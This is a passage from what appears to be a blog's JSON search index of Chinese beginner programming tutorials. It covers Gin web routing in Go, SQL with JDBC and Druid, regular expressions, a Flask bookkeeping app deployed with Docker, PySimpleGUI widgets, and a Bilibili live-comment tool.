main(){ r:=gin.Default()//获取gin框架默认路由对象 \tr.GET(\u0026#34;/\u0026#34;,sayHello)//处理向\u0026#34;/\u0026#34;目录发起的get请求，并将其使用sayHello函数处理 \tr.Run() } 项目实践中一般使用匿名函数：\nr.GET(\u0026#34;/\u0026#34;,func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \u0026#34;message\u0026#34;:\u0026#34;HelloWorld\u0026#34;, }) }) 使用Gin框架返回一个html文件\nfunc main(){ r:=gin.Default() r.LoadHTMLFiles(\u0026#34;hello.html\u0026#34;)//解析模板 \tr.GET(\u0026#34;/\u0026#34;,func(c *gin.Context){ c.HTML(http.StatusOK,\u0026#34;hello.html\u0026#34;,gin.H{}) }) r.Run() } 模板渲染 template package - html/template - pkg.go.dev\nGo语言标准库之http/template | 李文周的博客 (liwenzhou.com)\n一个简单示例\ntype User struct { //成员变量名必须为大写，使其可以被外部访问 \tName string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 \t// 解析模板 \tt, _ := template.ParseFiles(\u0026#34;./hello.tmpl\u0026#34;) // 渲染模板 \tu1 := User{ // u1.Name \tName: \u0026#34;zeroy\u0026#34;, Gender: \u0026#34;男\u0026#34;, Age: 18, } m1 := map[string]interface{}{ \u0026#34;name\u0026#34;: \u0026#34;zeroy\u0026#34;, \u0026#34;gender\u0026#34;: \u0026#34;男\u0026#34;, \u0026#34;age\u0026#34;: 18, } hobbyList := []string{ \u0026#34;乒乓球\u0026#34;, \u0026#34;网球\u0026#34;, \u0026#34;羽毛球\u0026#34;, } t.Execute(w, map[string]interface{}{ \u0026#34;u1\u0026#34;: u1, \u0026#34;m1\u0026#34;: m1, \u0026#34;hobby\u0026#34;: hobbyList, }) } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, sayHello) http.ListenAndServe(\u0026#34;:9000\u0026#34;, nil) } 在Gin框架中渲染模板\nfunc main(){ r:=gin.Default() r.LoadHTMLFiles(\u0026#34;hello.tmpl\u0026#34;)//加载模板 \tr.GET(\u0026#34;/\u0026#34;,func(c *gin.Context){ c.HTML(http.StatusOK,\u0026#34;hello.tmpl\u0026#34;,gin.H{//向模板中传递参数 \t\u0026#34;name\u0026#34;: \u0026#34;zeroy\u0026#34;, \u0026#34;age\u0026#34;: 18, }) }) r.Run() } 模板文件：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;name: {{.name}}\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;age: {{.age}}\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。\nGin框架返回json package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { r := gin.Default() r.GET(\u0026#34;/json\u0026#34;, func(c *gin.Context) { data := gin.H{\u0026#34;name\u0026#34;:\u0026#34;zeroy\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;hello world!\u0026#34;, \u0026#34;age\u0026#34;: 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\u0026#34;name\u0026#34;`//有时为了方便前端开发，需要为类型名创建别名（反射） \tMessage string Age int } r.GET(\u0026#34;/another_json\u0026#34;, func(c *gin.Context) { data := msg{ \u0026#34;zeroy\u0026#34;, \u0026#34;Hello golang!\u0026#34;, 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 \t}) r.Run() } 获取querystring参数 querystring参数即URL中?后的参数。\nusername := c.DefaultQuery(\u0026#34;username\u0026#34;, \u0026#34;zeroy\u0026#34;)//若查询不到username则默认值为zeroy address := c.Query(\u0026#34;address\u0026#34;) 例程：A+B Problem web版\npackage main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;strconv\u0026#34; ) func main() { r:=gin.Default() r.GET(\u0026#34;/\u0026#34;,func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\u0026#34;a\u0026#34;)) b,_:=strconv.Atoi(c.Query(\u0026#34;b\u0026#34;)) c.JSON(200,gin.H{\u0026#34;sum\u0026#34;:a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\u0026#34;username\u0026#34;) address := c.PostForm(\u0026#34;address\u0026#34;) PostForm方法可以获取Post请求提交的参数。\n获取path参数 例程：A+B Problem web版（使用path参数传参）\nfunc main() { r:=gin.Default() r.GET(\u0026#34;/:a/:b\u0026#34;,func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\u0026#34;a\u0026#34;)) b,_:=strconv.Atoi(c.Param(\u0026#34;b\u0026#34;)) c.JSON(200,gin.H{\u0026#34;sum\u0026#34;:a+b,}) }) r.Run() } 参数绑定 ShouldBind方法可以自动化绑定参数到某个struct中。\ntype People struct{ Name string `form:\u0026#34;name\u0026#34;`//设定别名，方便传参 \tAge int\t`form:\u0026#34;age\u0026#34;` BirthDay string `form:\u0026#34;birthday\u0026#34;` } func main() { r:=gin.Default() r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 \tif err := c.ShouldBind(\u0026amp;zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \u0026#34;name\u0026#34;:zeroy.Name, \u0026#34;age\u0026#34;:zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\u0026#34;error\u0026#34;: err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定\ntype Node struct{ X int `form:\u0026#34;x\u0026#34;` Y int `form:\u0026#34;y\u0026#34;` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026amp;tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \u0026#34;sum\u0026#34;:tmp.sum(), }) } else { c.JSON(http.StatusBadRequest, gin.H{\u0026#34;error\u0026#34;: err.Error()}) } }) r.Run() } 文件上传 c.FormFile(\u0026#34;\u0026#34;) dst := fmt.Sprintf(\u0026#34;./%s\u0026#34;, file.Filename) // 上传文件到指定的目录 c.SaveUploadedFile(file, dst) form, _ := c.MultipartForm()//多个文件上传 files := form.File[\u0026#34;file\u0026#34;] 总结 掌握了Gin框架的基本操作，我们便有能力搭建一个最最基本的web服务，处理来自用户端的请求。\n但是如果要搭建一个真正实用的服务器后端，还需要与本地的数据库进行交互（database/sql，GORM），进行复杂的鉴权操作。\n之后可能会看看数据库交互和一些中间件，实现鉴权和与本地数据库交互。\n","permalink":"https://zeroy.site/articles/Golang-web1/","summary":"自带的net/http库的使用 http库提供了HTTP服务的用户端和服务端的实现。\n官方文档\nGo语言基础之net/http | 李文周的博客 (liwenzhou.com)\n示例代码\n监听本地端口，在浏览器输出Hello World字符串。\nfunc sayHello(w http.ResponseWriter,r *http.Request){ //ResponseWriter为服务端返回的内容 \tfmt.Fprintln(w, \u0026#34;Hello World!\u0026#34;) } func main(){ http.HandleFunc(\u0026#34;/\u0026#34;,sayHello) http.ListenAndServe(\u0026#34;:8080\u0026#34;,nil) } Gin框架 简介 Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。\n官方中文文档\nGin框架介绍及使用 | 李文周的博客 (liwenzhou.com)\n特性\nGin v1 稳定的特性:  零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。  框架初识 使用Gin框架返回一个json文件\nfunc sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.","title":"Golang|Gin Web development for Beginners"},{"content":"数据库基础 增 新建数据库\nCREATE DATABASE {{name}} 新建数据表\nCREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束\n建表时添加\nCONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加\nalter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素\nEXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,\u0026#39;zeroy\u0026#39;,\u0026#39;2003-4-10\u0026#39;,100) , (2,\u0026#39;admin\u0026#39;,\u0026#39;2003-4-10\u0026#39;,99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务 事务能实现多条命令捆绑，一旦失败，会回滚所有操作。\n-- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计 一对多\n如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。\n多对多\n如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。\n实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。\n一对一\n用于表拆分，提升常用信息的访问速度。\nJDBC入门 简介 Java数据库连接，（Java Database Connectivity，简称JDBC）是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC也是Sun Microsystems的商标[1]。JDBC是面向关系型数据库的。\n步骤 注册驱动\nClass.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;) 获取连接对象\nConnection conn= DriverManager.getConnection(\u0026#34;jdbc:mysql://127.0.0.1:3306/{{数据库名}}\u0026#34;,\u0026#34;username\u0026#34;,\u0026#34;password\u0026#34;); 获取连接状态\n有两种方式，后者可以预处理sql模板。\nString sql=\u0026#34;SELECT * FROM customers\u0026#34;;//查询sql语句 Statement stmt=conn.createStatement(); PreparedStatement pstmt=conn.prepareStatement(sql); 发送查询请求\nResultSet rs=stmt.executeQuery(sql); Resultset rs=pstmt.executeQuery(); 将查询请求封装为对象储存\nwhile(rs.next()) { Customer customer = new Customer(); int customerId = rs.getInt(\u0026#34;customer_id\u0026#34;); String firstName = rs.getString(\u0026#34;firstName\u0026#34;); String lastName = rs.getString(\u0026#34;lastName\u0026#34;); Date birthDate = rs.getDate(\u0026#34;birthDate\u0026#34;); int points = rs.getInt(\u0026#34;points\u0026#34;); customer.setId(customerId); customer.setBirthDate(birthDate); customer.setFirstName(firstName); customer.setLastName(lastName); customer.setPoints(points); customers.add(customer); } 使用PreparedStatement模板查询或修改数据\n使用？作为占位符，在后续代码中再进行数据填充。\nString sql=\u0026#34;insert customers(first_name,last_name,birth_date,points,address,city,state) value(?,?,?,?,?,?,?);\u0026#34;; PreparedStatement pstmt=conn.prepareStatement(sql); pstmt.setString(1,firstName); pstmt.setString(2,lastName); pstmt.setDate(3,birthDate); pstmt.setInt(4,points); pstmt.setString(5,addtress); pstmt.setString(6,city); pstmt.setString(7,state); 这样做的优点是可以预防SQL注入。\nPreparedStatement对象会对输入的字符串做转义处理，可以防止原理为简单字符串拼接生效的SQL注入。（当然还有模板注入防不了）\nDruid数据库连接池的简单使用 简介 在软件工程中，连接池（英语：connection pool）是维护的数据库连接的缓存，以便在将来需要对数据库发出请求时可以重用连接。 连接池用于提高在数据库上执行命令的性能。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序发出的请求，既昂贵又浪费资源。在连接池中，创建连接之后，将连接放在池中并再次使用，这样就不必创建新的连接。如果所有连接都正在使用，则创建一个新连接并将其添加到池中。连接池还减少了用户必须等待创建与数据库的连接的时间。\nDruid是由阿里巴巴开发的数据库连接池。\n配置文件的书写 driverClassName=com.mysql.jdbc.Driver\rurl={{数据库地址}}\rusername={{your username}}\rpassword={{your password}}\r# 默认连接数\rinitialSize=5\r# 最大连接数\rmaxActive=10\r# 最长等待时间\rmaxWait=3000\r从数据库连接池中获取连接 Properties prop=new Properties(); prop.load(new FileInputStream(\u0026#34;src/druid.properties\u0026#34;));//填写druid配置文件的路径 DataSource dataSource= DruidDataSourceFactory.createDataSource(prop); Connection conn=dataSource.getConnection(); ","permalink":"https://zeroy.site/articles/database-for-beginner/","summary":"数据库基础 增 新建数据库\nCREATE DATABASE {{name}} 新建数据表\nCREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束\n建表时添加\nCONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加\nalter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素\nEXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,\u0026#39;zeroy\u0026#39;,\u0026#39;2003-4-10\u0026#39;,100) , (2,\u0026#39;admin\u0026#39;,\u0026#39;2003-4-10\u0026#39;,99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务 事务能实现多条命令捆绑，一旦失败，会回滚所有操作。","title":"数据库基础|JDBC入门|Druid连接池的简单配置"},{"content":"简介 正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。\n许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。\n语法总结 需要转义的特殊字符：\n.[{()\\^$|?*+\r就像在其它任何语言中那样，转义需要在符号前加上\\。\n匹配规则：\n. - 除了新行外的任何字符\r\\d - 数字 (0-9)\r\\D - 非数字 (0-9)\r\\w - 单词字母 (a-z, A-Z, 0-9, _)\r\\W - 非单词字母\r\\s - 空字符 (space, tab, newline)\r\\S - 非空字符 (space, tab, newline)\r\\b - 单词边界\r\\B - 非单词边界\r^ - 字符串开头（默认将一行看作一整个字符串）\r$ - 字符串结尾（默认将一行看作一整个字符串）\r[] - 匹配字符集\r[^ ] - 匹配除了字符集外的字符\r| - 或者\r( ) - Group\rQuantifiers:\r* - 0 or More\r+ - 1 or More\r? - 0 or One\r{3} - Exact Number\r{3,4} - Range of Numbers (Minimum, Maximum)\r[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+\r一些例子：\n匹配人名：\nMr. Schafer\rMr Smith\rMs Davis\rMrs. Robinson\rMr. T\rM(r|s|rs)\\.?\\s[A-Z]\\w*\r匹配两种格式的电话号码：\n123.555.1234\r800-555-4321\r900-555-4321\r\\d{3}[.-]\\d{3}[.-]\\d{4}\r匹配三种格式的电子邮件：\nCoreyMSchafer@gmail.com\rcorey.schafer@university.edu\rcorey-321-schafer@my-work.net\r[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+\r按Group引用 提取文件中的url，并截取出其中的顶级域名：\nhttps://www.google.com\rhttp://coreyms.com\rhttps://youtube.com\rhttps://www.nasa.gov\r匹配https?://(www\\.)?(\\w+)(\\.\\w+)\r引用：$2$3\r结果：\rgoogle.com\rcoreyms.com\ryoutube.com\rnasa.gov\r","permalink":"https://zeroy.site/articles/regular-expression/","summary":"简介 正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。\n许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。\n语法总结 需要转义的特殊字符：\n.[{()\\^$|?*+\r就像在其它任何语言中那样，转义需要在符号前加上\\。\n匹配规则：\n. - 除了新行外的任何字符\r\\d - 数字 (0-9)\r\\D - 非数字 (0-9)\r\\w - 单词字母 (a-z, A-Z, 0-9, _)\r\\W - 非单词字母\r\\s - 空字符 (space, tab, newline)\r\\S - 非空字符 (space, tab, newline)\r\\b - 单词边界\r\\B - 非单词边界\r^ - 字符串开头（默认将一行看作一整个字符串）\r$ - 字符串结尾（默认将一行看作一整个字符串）\r[] - 匹配字符集\r[^ ] - 匹配除了字符集外的字符\r| - 或者\r( ) - Group\rQuantifiers:\r* - 0 or More\r+ - 1 or More\r?","title":"正则表达式 For Beginner"},{"content":"功能描述  支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据  基本结构 Demo 项目地址\n技术路线 后端：python-Flask\n前端：BootStrap\n踩过的坑  程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为\u0026rsquo;None'）  Docker应用部署细节 Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。\n使用阿里云作为Docker Hub。\n#注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。\ndocker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","permalink":"https://zeroy.site/articles/tallyapp1/","summary":"功能描述  支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据  基本结构 Demo 项目地址\n技术路线 后端：python-Flask\n前端：BootStrap\n踩过的坑  程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为\u0026rsquo;None'）  Docker应用部署细节 Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。\n使用阿里云作为Docker Hub。\n#注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。\ndocker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","title":"Flask学习1 TallyApp beta 0.9"},{"content":"前言 python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。\n于是我找到了PySimpleGUI这个库。\nA introduction to PySimpleGUI\n这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。\n安装 pip install PySimpleGUI\r在文件开头加上库引用：\nimport PySimpleGUI as sg 元素 PySimpleGUI有着丰富的控件支持。\n 文本框（Text）  sg.Text(\u0026#39;文本框\u0026#39;,size=(12,1),key=\u0026#39;output\u0026#39;) '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。\n输入框（Input）  sg.Input(key=\u0026#39;input\u0026#39;) 按钮（Button）  sg.Button(\u0026#39;Go\u0026#39;) 'Go'为按钮的名字。也可以另外设置key值。\n下拉框（Comobo）  [ sg.Text(\u0026#34;City\u0026#34;, size = (20, 1)), sg.Combo((\u0026#34;北京\u0026#34;, \u0026#34;上海\u0026#34;, \u0026#34;深圳\u0026#34;), size=(10, 1), default_value=\u0026#34;上海\u0026#34;, key = \u0026#34;-CITY-\u0026#34;)] 弹窗（Popup）  sg.Popup(\u0026#39;弹窗1\u0026#39;,\u0026#39;This is the first one\u0026#39;) sg.Popup(\u0026#39;弹窗2\u0026#39;,\u0026#39;This is the second one\u0026#39;) sg.Popup(\u0026#39;弹窗3\u0026#39;,\u0026#39;This is the third one\u0026#39;) 弹出一个窗口包含标题和内容。\n选择文件（FileBrowse）  sg.FileBrowse() 选择文件路径（FolderBrowse）  sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox）  list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key=\u0026#39;LIST\u0026#39;,enable_events=True)] ] 多选框（Checkbox）  sg.Checkbox(\u0026#39;多选框\u0026#39;,default=True) 单选框（Radio）  # RADIO1 必有 sg.Radio(\u0026#39;单选框\u0026#39;,\u0026#39;RADIO1\u0026#39;,default=True) 大文本框（Multiline）  sg.Multiline(default_text=\u0026#39;hello\u0026#39;) 下拉列表框（InputCombo）  sg.InputCombo([\u0026#39;box_1\u0026#39;,\u0026#39;box_2\u0026#39;],size=(20,3)) 拖动按钮（Slider）  sg.Slider(range=(1,100),orientation=\u0026#39;h\u0026#39;,size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu）  sg.InputOptionMenu(\u0026#39;Menu_1\u0026#39;,\u0026#39;Menu_2\u0026#39;,size=(20,2)) 菜单（Menu）  sg.Menu(menu_def, tearoff=True) 控件（Column）  sg.Column(column1, background_color=\u0026#39;\u0026#39;) 进度条（ProgressBar）  sg.ProgressBar(10,orientation=\u0026#39;h\u0026#39;,size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口  sg.Print(\u0026#39;内容\u0026#39;, text_color=\u0026#39;\u0026#39;, background_color=\u0026#39;\u0026#39;, font=\u0026#39;\u0026#39;) 自带按钮  sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button(\u0026#39;Ok\u0026#39;), sg.Button(\u0026#39;Cancel\u0026#39;) 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口 使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。\n以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy\u0026rsquo;s blog中的GUI界面为例：\nsg.theme(\u0026#39;DarkAmber\u0026#39;)#选择主题 layout = [ [sg.Listbox(\u0026#39;\u0026#39;,size=(75,20),key=\u0026#39;-OUT-\u0026#39;)], [sg.Text(\u0026#39;发送弹幕: \u0026#39;, size=(8, 1)),sg.InputText(\u0026#39;\u0026#39;,key=\u0026#39;-input-\u0026#39;),sg.Button(\u0026#34;Go\u0026#34;),sg.Button(\u0026#34;Exit\u0026#34;),sg.Button(\u0026#34;Help\u0026#34;)], [sg.Text(\u0026#39;\u0026#39;,key=\u0026#39;-error-\u0026#39;)] ]#使用list描述元素之间的相对关系 window=sg.Window(\u0026#34;Bilibili弹幕收发程序\u0026#34;,layout)生成窗口 怎么样，是不是很方便呢？\n窗口中内建了多种方法，用于描述窗口事件。\nwindow.close()#关闭窗口 window.read()#读取窗口内容 window[\u0026#39;key名\u0026#39;].update(\u0026#39;需要更新的内容\u0026#39;) 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。\n上面提到的收发弹幕的程序的GUI部分完整代码如下：\nimport PySimpleGUI as sg import send import receive sg.theme(\u0026#39;DarkAmber\u0026#39;) layout = [ [sg.Listbox(\u0026#39;\u0026#39;,size=(75,20),key=\u0026#39;-OUT-\u0026#39;)], [sg.Text(\u0026#39;发送弹幕: \u0026#39;, size=(8, 1)),sg.InputText(\u0026#39;\u0026#39;,key=\u0026#39;-input-\u0026#39;),sg.Button(\u0026#34;Go\u0026#34;),sg.Button(\u0026#34;Exit\u0026#34;),sg.Button(\u0026#34;Help\u0026#34;)], [sg.Text(\u0026#39;\u0026#39;,key=\u0026#39;-error-\u0026#39;)] ] window=sg.Window(\u0026#34;Bilibili弹幕收发程序\u0026#34;,layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window[\u0026#39;-OUT-\u0026#39;].update(receive.Receive())#更新输出框 except: sg.popup(\u0026#39;error: \u0026#39;,\u0026#39;请先配置好同一目录下的config.json文件\u0026#39;)#异常信息处理 break if event in (None,\u0026#39;Exit\u0026#39;):#按到了退出 break if event==\u0026#39;Go\u0026#39;:#发送弹幕 window[\u0026#39;-error-\u0026#39;].update(send.Send(values[\u0026#39;-input-\u0026#39;])) window[\u0026#39;-input-\u0026#39;].update(\u0026#34;\u0026#34;) if event==\u0026#39;Help\u0026#39;:#帮助页面 sg.popup(\u0026#39;帮助: \u0026#39;,\u0026#39;请先配置好同一目录下的config.json文件\u0026#39;) window.close() 更多的例子以及更高阶的应用指路：官方代码库\n总结 这个东西过于简洁，适合完全不会写GUI的程序员应急。\n","permalink":"https://zeroy.site/articles/PySimpleGUI/","summary":"前言 python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。\n于是我找到了PySimpleGUI这个库。\nA introduction to PySimpleGUI\n这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。\n安装 pip install PySimpleGUI\r在文件开头加上库引用：\nimport PySimpleGUI as sg 元素 PySimpleGUI有着丰富的控件支持。\n 文本框（Text）  sg.Text(\u0026#39;文本框\u0026#39;,size=(12,1),key=\u0026#39;output\u0026#39;) '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。\n输入框（Input）  sg.Input(key=\u0026#39;input\u0026#39;) 按钮（Button）  sg.Button(\u0026#39;Go\u0026#39;) 'Go'为按钮的名字。也可以另外设置key值。\n下拉框（Comobo）  [ sg.Text(\u0026#34;City\u0026#34;, size = (20, 1)), sg.Combo((\u0026#34;北京\u0026#34;, \u0026#34;上海\u0026#34;, \u0026#34;深圳\u0026#34;), size=(10, 1), default_value=\u0026#34;上海\u0026#34;, key = \u0026#34;-CITY-\u0026#34;)] 弹窗（Popup）  sg.Popup(\u0026#39;弹窗1\u0026#39;,\u0026#39;This is the first one\u0026#39;) sg.Popup(\u0026#39;弹窗2\u0026#39;,\u0026#39;This is the second one\u0026#39;) sg.Popup(\u0026#39;弹窗3\u0026#39;,\u0026#39;This is the third one\u0026#39;) 弹出一个窗口包含标题和内容。\n选择文件（FileBrowse）  sg.FileBrowse() 选择文件路径（FolderBrowse）  sg.","title":"使用PySimpleGUI库构建简单的图形界面"},{"content":"项目地址\n需求分析 在Linux下直播看不到弹幕，无法与观众互动。\n实现过程 第一阶段 问题可拆分为收与发。\n可行性分析 B站有API能够返回一个直播间最近的10条弹幕，可以依赖这个API接收弹幕。\n抓包可知一次发送弹幕的行为即为一次POST请求，可以使用python脚本实现发送信息。\n分别编写发送和接收弹幕的程序。开两个终端使用。\n第二阶段 开两个终端切换较为麻烦，于是萌生了把两个程序整合成一个的想法，想实现类似网页的上方是弹幕下方是输入框的效果。\n可行性分析 弹幕的动态捕捉依赖间隔固定时间地获取最近10条弹幕，提取出新的弹幕，显示在终端上，但是如果整合进输入程序，输入方法会阻塞进程，如果一直不输入就没有办法获取新的弹幕，所以需要为输入设定超时。\n查阅资料得知，为输入方法设定超时需要使用多线程，或者异步异常信息处理，刚学py，不会这些。。。\n查阅英文资料和pypi得知，python有个inputimeout库可以处理超时输入的问题，所以就整上了。\n但是在现在这一流程中，每次输入超时都需要清屏，这样每次更新弹幕的时候都会闪一下，体验非常不好。\n第三阶段 有没有办法实现一个terminal中分屏显示都个session呢？\n可行性分析 结合我个人的Linux使用经验，可以使用tmux这个工具实现分屏操作，所以第二阶段的工作就白做了。。。\n最终效果 不足与提升空间 冷启动时需要较多的步骤，不够优雅。\n未来可以尝试使用GUI框架封装代码，实现一个输出框一个输入框收发代码。\n1/25 Update 采用PysimpleGUI这个最简单的GUI库封装了代码，现在很好用（）\n","permalink":"https://zeroy.site/articles/Bilibili-send-and-receive/","summary":"项目地址\n需求分析 在Linux下直播看不到弹幕，无法与观众互动。\n实现过程 第一阶段 问题可拆分为收与发。\n可行性分析 